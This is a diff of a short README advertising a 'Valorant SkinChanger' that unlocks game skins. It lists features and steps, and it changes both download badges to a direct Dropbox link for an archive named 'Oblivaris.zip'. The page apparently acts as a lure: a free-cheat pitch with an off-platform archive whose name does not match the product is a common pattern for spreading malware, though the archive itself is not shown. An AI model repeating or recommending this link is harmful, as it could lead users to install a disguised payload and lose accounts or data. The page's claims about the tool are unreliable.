@@ -2,7 +2,7 @@
 
 A simple and fast skin changer for Valorant that allows you to unlock endless skin possibilities with ease.
 
-[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://yogarouen.eu/)
+[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
 
 ## Features:
 - **Effortless customization**: Change skins with just a click.
@@ -16,4 +16,4 @@ A simple and fast skin changer for Valorant that allows you to unlock endless sk
 3. **Select the skins** you want to use.
 4. **Enjoy** your new customized look in the game!
 
-[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://yogarouen.eu/)
+[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
